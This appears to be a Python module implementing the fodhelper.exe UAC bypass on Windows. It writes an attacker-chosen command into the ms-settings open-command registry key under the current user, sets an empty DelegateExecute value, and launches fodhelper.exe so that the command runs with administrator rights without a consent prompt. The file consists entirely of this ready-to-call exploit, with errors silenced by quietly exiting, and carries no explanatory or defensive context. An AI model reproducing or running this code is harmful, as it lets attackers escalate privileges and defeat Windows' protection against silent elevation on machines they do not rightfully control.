import os
import time
import ctypes
import winreg
from sys import exit
from subprocess import Popen, PIPE


FOD_HELPER = r'C:\Windows\System32\fodhelper.exe'
REG_PATH = 'Software\Classes\ms-settings\shell\open\command'
DELEGATE_EXEC_REG_KEY = 'DelegateExecute'


def is_running_as_admin(): 
  try:
    return ctypes.windll.shell32.IsUserAnAdmin()
  except:
    return False


def create_reg_key(key, value):
  try:        
    winreg.CreateKey(winreg.HKEY_CURRENT_USER, REG_PATH)
    registry_key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, REG_PATH, 0, winreg.KEY_WRITE)                
    winreg.SetValueEx(registry_key, key, 0, winreg.REG_SZ, value)        
    winreg.CloseKey(registry_key)
  except WindowsError:        
    exit(0)


def bypass_uac(cmd, timeout=2.5):
  try:
    time.sleep(timeout)
    create_reg_key(DELEGATE_EXEC_REG_KEY, '')
    create_reg_key(None, cmd)
  except WindowsError:
    exit(0)


def Bypass(path):
  try:
    bypass_uac(path)
    os.system(FOD_HELPER)
  except WindowsError:
    exit(0)